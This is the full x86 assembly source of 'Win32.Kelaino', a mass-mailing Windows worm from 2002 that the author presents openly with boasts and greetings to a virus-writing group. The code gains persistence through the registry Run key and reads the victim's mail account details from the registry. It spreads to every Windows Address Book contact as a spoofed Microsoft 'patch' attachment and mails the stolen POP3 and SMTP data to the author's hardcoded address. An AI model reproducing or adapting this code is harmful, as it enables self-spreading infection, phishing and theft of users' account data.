; Name:       Win32.Kelaino
; Coder:      BeLiAL/bcvg
; Type:       Worm

; Because of the fact that good old file infectors are nearly dead
; i coded this little worm. Its my newest generation of virii, because
; i never coded such a worm before. ;)
; It searches from the registry some data like smtp server, WAB, etc...
; After this procedure the worm copies itself to the windows directory and
; write itself in the registry in the 'Run' folder (autostart!). When this
; is done, it displays after a firsttime installation a message box for the victim.
; Now it waits since the computer gets an inet connection. After the connection
; is established it sends itself to all people in the WAB. The worm uses a
; SMTP engine, not the MAPI stuff from windows. The mail it sends is a
; spoofed message from microsoft which contains the worm (looking like a patch).
; As payload it sends to me some personal data like pop3 server and username
; via mail too.
; of the poor victim. When there is no smtp server in the registry, the worm 
; uses an hardcoded server.
; The data segment has to be ebcrypted with a simple 8-Bit encryption from 
; dataenc.asm (some lame kiddies spy files with hexedit and feel elite).
; Im quite happy with this worm but bedder and newer generations of worms
; will follow! My scanners looked all together for PE-Infection Virii (especially for
; the procedure which searches for APIs in the kernel), so they didnt find my
; Win32.Kelaino. HuarHuar!!!!

; Credits:

; - Thanx to BumbleBee for his Base64 encrypter and tuts
; - Greetings to the whole BlackCat Group especially to Danny T and SatanicCoder
; - I also want to say hello to my friend PhileToaster, hope well meet each other
;   someday ;) 
; - Special greets fly out to Cwarrior, malfunction, nekronomicon and the whole
;   #german_vir channel
; - And last but not least greetings to Mandragore, Virusbust and Toro
;
;
; BeLiAL, early 2002 / Black Cat Virus Group 


.386
.model flat

EXTRN ExitProcess:Proc
EXTRN WSAStartup:Proc
EXTRN socket:Proc
EXTRN WSACleanup:Proc
EXTRN closesocket:Proc
EXTRN gethostbyname:Proc
EXTRN send:Proc
EXTRN recv:Proc
EXTRN htons:Proc
EXTRN connect:Proc
EXTRN CreateFileA:Proc
EXTRN CreateFileMappingA:Proc
EXTRN MapViewOfFile:Proc
EXTRN CloseHandle:Proc
EXTRN UnmapViewOfFile:Proc
EXTRN GlobalAlloc:Proc
EXTRN GlobalFree:Proc
EXTRN RegOpenKeyExA:Proc
EXTRN RegSetValueExA:Proc
EXTRN RegQueryValueExA:Proc
EXTRN RegCloseKey:Proc
EXTRN GetModuleFileNameA:Proc
EXTRN GetProcAddress:Proc
EXTRN LoadLibraryA:Proc
EXTRN FreeLibrary:Proc
EXTRN CopyFileA:Proc
EXTRN GetWindowsDirectoryA:Proc
EXTRN GetCurrentDirectoryA:Proc
EXTRN SetCurrentDirectoryA:Proc
EXTRN MessageBoxA:Proc
EXTRN GetFileSize:Proc

;------------------------------------------------------data and equates--------------------------------

SOCK_STREAM         EQU     1
AF_INET               EQU     2
MAIL_TEXT_LENGHT      EQU     offset mail_lenght_end -  offset mail_lenght_start
MAIL_TEXT_LENGHT2     EQU     offset mail_lenght_end2 - offset mail_lenght_start2
HKEY_CURRENT_USER     EQU     80000001h
HKEY_LOCAL_MACHINE    EQU     80000002h
KEY_ALL_ACCESS        EQU     001F0000h
PAGE_READONLY         EQU     2
FILE_MAP_READ         EQU     4
REG_SZ          EQU     1
INFO_MAIL             EQU     00000001h
FAKE_MAIL             EQU     00000002h

.data

WSADATA     struct

    mVersion          dw    0
    mHighVersion    dw  0
    szDescription   db  257 dup(0)
    szSystemStatus  db  129 dup(0)
    iMaxSockets dw  0
    iMaxUpdDg   dw  0
    lpVendorInfo    dd  0

WSADATA     ends

SOCKADDR_IN       struc

      sin_family dw 0
      sin_port   dw 0
      sin_addr   dd 0
      sin_zero   db 8 dup(0)

SOCKADDR_IN       ends  

data_seg_start:

wsadata             WSADATA <>
sockaddr_in             SOCKADDR_IN <>     

socket_descriptor       dd 0
hardcode_server         db "www.festu.ru",0
smtpaddress_offset      dd 0
smtp_ip                 dd 0
to_read_data            dd 0
data_in_buffer          db 100 dup(0)

the_helo                dd 14
                        db "helo support",13,10
the_mailfrom            dd 34
                        db "mail from: support@microsoft.com",13,10                        
the_rcptto              dd 9
                        db "rcpt to: "
the_data                dd 6
                        db "data",13,10                                                                          
the_helo2               dd 12
                        db "helo admin",13,10
the_mailfrom2           dd 27
                        db "mail from: admin@festu.ru",13,10
                                                
the_datatest            dd MAIL_TEXT_LENGHT
mail_lenght_start:
                        db 'From: "Microsoft Support" <support@microsoft.com>',0dh,0ah
                        db 'Subject: Support Message',0dh,0ah
                        db 'MIME-Version: 1.0',0dh,0ah
                        db 'Content-Type: multipart/mixed;',0dh,0ah
                        db '        boundary="----=_NextPart_000_0005_01BDE2EC.8B286C00"',0dh,0ah
                        db 'X-Priority: 3',0dh,0ah
                        db 'X-MSMail-Priority: Normal',0dh,0ah
                        db 'X-Unsent: 1',0dh,0ah
                        db 'X-MimeOLE: Produced By Microsoft MimeOLE V4.72.3110.3',0dh,0ah

                        db '------=_NextPart_000_0005_01BDE2EC.8B286C00',0dh,0ah
                        db 'Content-Type: text/plain; charset=iso-8859-1',0dh,0ah
                        db 'Content-Transfer-Encoding: quoted-printable',0dh,0ah                
                        db 13,10
                        
                        db "During the last time, many bugs were found in our software. Because",13,10
                        db "of our product philosophie, we want to give our custumers as much security",13,10
                        db "as possible. So we decided to send out to all known Microsoft custumers the",13,10
                        db "NetBios patch Version 1.0 . This patch will fix all the known and possibly unknown",13,10
                        db "bugs and securityholes on port 137 and 139 .",13,10
                        db "The patch is completly free and easy to install. Our patch will install",13,10
                        db "itself after starting and run as background process. After a successfull",13,10
                        db "installation you should get an OK message box.",13,10 
                        db "Thanx for using Microsoft products.",13,10,13,10,13,10
                        db "Your Microsoft Support Team",13,10,13,10
                        
                        db '------=_NextPart_000_0005_01BDE2EC.8B286C00',0dh,0ah
                        db 'Content-Type: application/octet-stream; name=netbiospatch10.exe',0dh,0ah
                        db 'Content-Transfer-Encoding: base64',0dh,0ah
                        db 'Content-Disposition: attachment; filename="netbiospatch10.exe"',0dh,0ah,0dh,0ah
mail_lenght_end:

the_datatest2           dd MAIL_TEXT_LENGHT2
mail_lenght_start2:
                        db 'From: "Kelaino" <kelaino@microsoft.com>',0dh,0ah
                        db 'Subject: Slave Message',0dh,0ah
                        db 'MIME-Version: 1.0',0dh,0ah
                        db 'Content-Type: multipart/mixed;',0dh,0ah
                        db '        boundary="----=_NextPart_000_0005_01BDE2EC.8B286C00"',0dh,0ah
                        db 'X-Priority: 3',0dh,0ah
                        db 'X-MSMail-Priority: Normal',0dh,0ah
                        db 'X-Unsent: 1',0dh,0ah
                        db 'X-MimeOLE: Produced By Microsoft MimeOLE V4.72.3110.3',0dh,0ah

                        db '------=_NextPart_000_0005_01BDE2EC.8B286C00',0dh,0ah
                        db 'Content-Type: text/plain; charset=iso-8859-1',0dh,0ah
                        db 'Content-Transfer-Encoding: quoted-printable',0dh,0ah                
                        db 13,10

user_pop3_server        db 30 dup(0)
                        db 13,10
user_pop3_name          db 30 dup(0)
                        db 13,10
user_smtp_address       db 30 dup(0)
                        db 13,10,13,10
                        db "Glad to serve u, master",13,10

mail_lenght_end2:

fileend                 dd 9
                        db "--123--",13,10                        
the_dot                 dd 3
                        db ".",13,10
the_quit                dd 6
                        db "quit",13,10                                                
filehandle              dd 0
filemaphandle           dd 0
mapaddress              dd 0
freemem_offset          dd 0 

reg_account_string      db "Software\Microsoft\Internet Account Manager",0
reg_run_at_start        db "Software\Microsoft\Windows\CurrentVersion\Run",0
reg_wab_address         db "Software\Microsoft\WAB\WAB4\Wab File Name",0
phk_result              dd 0
phk_result2             dd 0
reg_account_string_plus db "Software\Microsoft\Internet Account Manager\Accounts\"
AccountIdx              db "00000000",0
default_mail_account    db "Default Mail Account",0
default_mail_account2   db "SMTP Server",0
pop3_account_value      db "POP3 Server",0
pop3_user_value         db "POP3 User Name",0
smtp_user_address       db "SMTP Email Address",0
reg_query_size          dd 9
reg_query_size2         dd 30
reg_query_size3         dd 80
user_smtp_server        db 30 dup(0)
wab_file_name           db 80 dup(0)
correct_command         db "250"  
myname                  db 80 dup(0)
windowsname             db 50 dup(0)
actualname              db 70 dup(0)

sendmailto_offset       dd 0
myfirstaddress          db "kelaino@freenet.de",0
lpdwFlags               dd 0
InternetGetConnectedState dd 0
                        db "InternetGetConnectedState",0
dllname                 db "wininet.dll",0  
libhandle               dd 0 
spirulina               db "netbiospatch10.exe",0
message_text            db "Couldn't execute frame buffer!",0
message_title           db "KERNEL32 ERROR",0
mail_mode               dd 0
unicode_mail_buffer     db 50 dup (0)
file_size               dd 0
wab_in_memory           dd 0
netpatch                db "netpatch",0
            db "Win32.Kelaino coded by BeLiAL/BCVG"

data_seg_end:                     

;------------------------------------------the virus starts here------------------------------------

.code

start:

mov ecx,offset data_seg_end
sub ecx,offset data_seg_start
mov eax,offset data_seg_start

decryption_loop:

cmp ecx,0
je start2
sub byte ptr [eax],30h
inc eax
dec ecx
jmp decryption_loop

start2:

push 80
push offset myname
push 0
call GetModuleFileNameA     ;Get its own filename

push offset dllname
call LoadLibraryA
mov dword ptr [libhandle],eax   ;Load the wininet.dll

mov ebx,offset InternetGetConnectedState
add ebx,4
push ebx
push eax
call GetProcAddress
mov dword ptr [InternetGetConnectedState],eax
cmp eax,0
je that_was_it                  ;load InternetGetConnectedState() API
 
call InstallVirus               ;copy Virus to Windir and Registry

call CollectData                ;collect smtp-server and stuff like this from the registry

wait_for_connection:

push 0
push offset lpdwFlags
call dword ptr [InternetGetConnectedState]
cmp eax,0
je wait_for_connection          ;an endless check-connection loop

call SearchWAB                  ;open the WAB file and copy it to memory
cmp eax,0
je bedder_exit_now

mov ecx,dword ptr [eax+64h]
jecxz finished_with_mail
add eax,dword ptr [eax+60h]
cmp byte ptr [eax+1],00h    ;Are the Mailaddresses is in Unicode?
jne mail_loop

mov edx,offset unicode_mail_buffer
push eax

unicode_loop:                   ;A special way for handling the unicode string

mov bl,byte ptr [eax]
mov byte ptr [edx],bl
cmp bl,0
je send_unicode_mail
add eax,2
add edx,1
jmp unicode_loop

send_unicode_mail:

pop eax
add eax,48h

push offset unicode_mail_buffer                 
push FAKE_MAIL
call SendMail
sub ecx,1
cmp ecx,0
je finished_with_mail
push eax
mov edx,offset unicode_mail_buffer  
jmp unicode_loop

mail_loop:

push eax                        ;the mailaddress offset
push FAKE_MAIL                  ;in my routines, two mailtypes are possible
call SendMail                   ;send the mail
sub ecx,1
cmp ecx,0
je finished_with_mail
add eax,24h
jmp mail_loop 

finished_with_mail:

push dword ptr [wab_in_memory]
call GlobalFree         ;Unload the WAB-file in memory

bedder_exit_now:

push offset myfirstaddress
push INFO_MAIL                  ;thats not a faked mail for spreading, it sends me some data
call SendMail

push dword ptr [libhandle]      ;unload wininet.dll
call FreeLibrary

that_was_it:

push 0
call ExitProcess                ;exit

;-------------------------------------------procedures------------------------------------------------

InstallVirus proc

push 50
push offset windowsname
call GetWindowsDirectoryA

push offset actualname
push 70
call GetCurrentDirectoryA
 
push offset windowsname
call SetCurrentDirectoryA

push 1
push offset spirulina
push offset myname
call CopyFileA          ;copy virus now to windir
cmp eax,0
je install_registry

push 0
push offset message_title
push offset message_text
push 0
call MessageBoxA                ;if its created first time, display a message box

install_registry:

push offset phk_result
push KEY_ALL_ACCESS
push 0
push offset reg_run_at_start
push HKEY_LOCAL_MACHINE 
call RegOpenKeyExA      ;open the autorun folder in the registry
cmp dword ptr [phk_result],0
je abort_installation

push 18 
push offset spirulina
push REG_SZ
push 0
push offset netpatch
push dword ptr [phk_result]
call RegSetValueExA     ;make a new value which points to our worm

push dword ptr [phk_result]
call RegCloseKey
mov dword ptr [phk_result],0

abort_installation:

ret

endp

CollectData proc

push offset phk_result
push KEY_ALL_ACCESS
push 0
push offset reg_account_string
push HKEY_CURRENT_USER 
call RegOpenKeyExA      
cmp dword ptr [phk_result],0
je take_default_settings    ;Open the Internet Account Manager

push offset reg_query_size
push offset AccountIdx
push 0
push 0
push offset default_mail_account
push dword ptr [phk_result]
call RegQueryValueExA       ;get the folder which contains the personal settings
cmp dword ptr [AccountIdx+7],30h
je take_default_settings
mov dword ptr [reg_query_size],9

push dword ptr [phk_result]
call RegCloseKey
mov dword ptr [phk_result],0

push offset phk_result
push KEY_ALL_ACCESS
push 0
push offset reg_account_string_plus
push HKEY_CURRENT_USER 
call RegOpenKeyExA
cmp dword ptr [phk_result],0
je take_default_settings        ;open this folder

push offset reg_query_size2
push offset user_pop3_server
push 0
push 0
push offset pop3_account_value
push dword ptr [phk_result]
call RegQueryValueExA           ;get pop3 server
mov dword ptr [reg_query_size2],30 

push offset reg_query_size2
push offset user_smtp_address
push 0
push 0
push offset smtp_user_address
push dword ptr [phk_result]
call RegQueryValueExA
mov dword ptr [reg_query_size2],30  ;get victim mail address    

push offset reg_query_size2
push offset user_pop3_name
push 0
push 0
push offset pop3_user_value
push dword ptr [phk_result]
call RegQueryValueExA
mov dword ptr [reg_query_size2],30  ;get victim user name

push offset reg_query_size2
push offset user_smtp_server
push 0
push 0
push offset default_mail_account2
push dword ptr [phk_result]
call RegQueryValueExA
mov dword ptr [reg_query_size2],30  ;get the users smtp server

cmp dword ptr [user_smtp_server],0
je closereg_and_exit

mov eax,offset user_smtp_server
mov dword ptr [smtpaddress_offset],eax  ;take this smtp server for sending mails

push dword ptr [phk_result]
call RegCloseKey
mov dword ptr [phk_result],0
 
ret

closereg_and_exit:

push dword ptr [phk_result]
call RegCloseKey

take_default_settings:

mov eax,offset hardcode_server
mov dword ptr [smtpaddress_offset],eax  ;when there isnt a smtp server, take a
                                ;hardcoded one  

ret

endp

SearchWAB proc

push offset phk_result2
push KEY_ALL_ACCESS
push 0
push offset reg_wab_address
push HKEY_CURRENT_USER 
call RegOpenKeyExA          ;is there a reg key for the wab location?
cmp dword ptr [phk_result2],0
je wab_file_error

push offset reg_query_size3
push offset wab_file_name
push 0
push 0
push 0
push dword ptr [phk_result2]
call RegQueryValueExA           ;get the path of the wab file

push dword ptr [phk_result2]
call RegCloseKey

cmp dword ptr [wab_file_name],0
je wab_file_error

push 0
push 0
push 3
push 0
push 1
push 80000000h
push offset wab_file_name 
call CreateFileA            ;open the wab file
cmp eax,0ffffffffh
je wab_file_error

mov dword ptr [filehandle],eax

push 0
push dword ptr [filehandle]
call GetFileSize            ;get the size of thi phile
mov dword ptr [file_size],eax

push 0
push dword ptr [file_size]
push 0
push PAGE_READONLY
push 0
push dword ptr filehandle
call CreateFileMappingA
mov dword ptr filemaphandle,eax

push dword ptr [file_size]
push 0
push 0
push FILE_MAP_READ
push dword ptr filemaphandle
call MapViewOfFile          ;Make a file mapping
mov dword ptr mapaddress,eax
push eax

push dword ptr [file_size]
push 0
call GlobalAlloc            ;Locate some mem 
mov dword ptr [wab_in_memory],eax

mov edi,eax
pop esi
mov ecx,dword ptr [file_size]
rep movsb                               ;copy mapped file to mem 

push dword ptr [mapaddress]
call UnmapViewOfFile

push dword ptr [filemaphandle]
call CloseHandle

push dword ptr [filehandle]
call CloseHandle            ;Close file mapping

mov eax,dword ptr [wab_in_memory]       ;Give address of file in mem to eax

ret

wab_file_error:

mov eax,0
ret

endp

SendMail proc

pop esi
pop ebx
pop edx
push esi
mov dword ptr [sendmailto_offset],edx
mov dword ptr [mail_mode],ebx
push eax
push ecx                ; The two Parameters are stored

push offset wsadata
push 0101h 
call WSAStartup
test eax,eax
jne not_possible            ;Load Winsock

open_new_socket:

push 0
push SOCK_STREAM
push AF_INET
call socket             ;Create a socket
cmp eax,-1
je release_library

mov dword ptr [socket_descriptor],eax

got_smtp_server:

push dword ptr [smtpaddress_offset]
call gethostbyname
cmp eax,0
je try_another_mailserver

mov ebx,dword ptr [eax+10h]
mov eax,dword ptr [ebx]
mov dword ptr [smtp_ip],eax
mov word ptr sockaddr_in.sin_family,AF_INET
mov dword ptr sockaddr_in.sin_addr,eax

push 00000019h
call htons
mov word ptr sockaddr_in.sin_port,ax

push 00000010h
push offset sockaddr_in
push dword ptr [socket_descriptor]
call connect
cmp eax,-1
je try_another_mailserver

push 0000c000h
push 0
call GlobalAlloc
cmp eax,0
je close_socket
mov dword ptr [freemem_offset],eax

send_data:

call read_from_socket
cmp eax,-1
je try_another_mailserver

cmp dword ptr [smtpaddress_offset],offset hardcode_server
je another_helo
push offset the_helo
call send_to_socket
cmp eax,-1
je try_another_mailserver
jmp llll

another_helo:
push offset the_helo2
call send_to_socket
cmp eax,-1
je try_another_mailserver

llll:
call read_from_socket

cmp dword ptr [smtpaddress_offset],offset hardcode_server
je another_mailfrom
push offset the_mailfrom
call send_to_socket
jmp qqqq

another_mailfrom:
push offset the_mailfrom2
call send_to_socket

qqqq:
call read_from_socket
mov esi,ebx
mov edi,offset correct_command
mov ecx,3
rep cmpsb
je lets_send_mail

try_another_mailserver:

cmp dword ptr [smtpaddress_offset],offset hardcode_server
je close_socket
push dword ptr [socket_descriptor]
call closesocket
mov dword ptr [smtpaddress_offset],offset hardcode_server
jmp open_new_socket

lets_send_mail:

push offset the_rcptto
call send_to_socket

call SendAddress

call read_from_socket
mov esi,ebx
mov edi,offset correct_command
mov ecx,3
rep cmpsb
jne try_another_mailserver

push offset the_data
call send_to_socket

call read_from_socket

cmp dword ptr [mail_mode],INFO_MAIL
je another_mail_type
push offset the_datatest
call send_to_socket
jmp send_a_normal_mail

another_mail_type:
push offset the_datatest2
call send_to_socket
jmp dont_send_attachment

send_a_normal_mail:

call OpenSendObject

mov eax,dword ptr [freemem_offset]
add eax,6000h
mov edx,dword ptr [freemem_offset]
mov ecx,00003000h

call encodeBase64

push 0
push 00005000h
push dword ptr [freemem_offset]
push dword ptr [socket_descriptor]
call send

push offset fileend
call send_to_socket

dont_send_attachment:

push offset the_dot
call send_to_socket

call read_from_socket

push offset the_quit
call send_to_socket

call read_from_socket

close_socket:

push dword ptr [socket_descriptor]
call closesocket

free_the_memory:

push dword ptr [freemem_offset]
call GlobalFree

release_library:

call WSACleanup

not_possible:

pop ecx 
pop eax
ret

endp

read_from_socket proc

push 0
push 100
push offset data_in_buffer
push dword ptr [socket_descriptor]
call recv
mov ebx,offset data_in_buffer

ret

endp

send_to_socket proc

pop ebx
pop eax
push ebx

push 0
push dword ptr [eax]
add eax,4
push eax
push dword ptr [socket_descriptor]
call send

ret

endp

SendAddress proc

mov ecx,0
mov eax,dword ptr [sendmailto_offset]

try_next_char:

cmp byte ptr [eax],0
je found_lenght
add ecx,1
add eax,1
jmp try_next_char

found_lenght:

push 0
push ecx
push dword ptr [sendmailto_offset]
push dword ptr [socket_descriptor]
call send

push 0
push 2
call go_on_to
db 13,10
go_on_to:
push dword ptr [socket_descriptor]
call send

ret 

endp


OpenSendObject proc

push 0
push 0
push 3
push 0
push 1
push 80000000h
push offset myname 
call CreateFileA
cmp eax,0ffffffffh
jne make_map

pop eax
jmp close_socket

make_map:
mov dword ptr [filehandle],eax

push 0
push 00003000h
push 0
push PAGE_READONLY
push 0
push dword ptr filehandle
call CreateFileMappingA
mov dword ptr filemaphandle,eax

push 00003000h
push 0
push 0
push FILE_MAP_READ
push dword ptr filemaphandle
call MapViewOfFile
mov dword ptr mapaddress,eax

mov esi,dword ptr [mapaddress]
mov edi,dword ptr [freemem_offset]
add edi,6000h
mov ecx,3000h
rep movsb

push dword ptr [mapaddress]
call UnmapViewOfFile

push dword ptr [filemaphandle]
call CloseHandle

push dword ptr [filehandle]
call CloseHandle

ret

endp

encodeBase64 Proc

; input:
;       EAX = Address of data to encode
;       EDX = Address to put encoded data
;       ECX = Size of data to encode
; output:
;       ECX = size of encoded data
;
; encodeBase64 by Bumblebee. All rights reserved ;)

       xor     esi,esi
       call    over_enc_table
       db      "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
       db      "abcdefghijklmnopqrstuvwxyz"
       db      "0123456789+/"
over_enc_table:
        pop     edi
        push    ebp
        xor     ebp,ebp
baseLoop:
        movzx   ebx,byte ptr [eax]
        shr     bl,2
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,4
        mov     bh,0
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,6
        xor     bh,bh
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        xor     ebx,ebx
        movzx   ebx,byte ptr [eax]
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi
        inc     eax

        inc     ebp
        cmp     ebp,24
        jna     DontAddEndOfLine

        xor     ebp,ebp
        mov     word ptr [edx+esi],0A0Dh
        inc     esi
        inc     esi
        test    al,00h
        org     $-1

DontAddEndOfLine:

        inc     ebp
        sub     ecx,3
        or      ecx,ecx
        jne     baseLoop

        mov     ecx,esi
        add     edx,esi
        pop     ebp
        ret

encodeBase64 EndP

end start

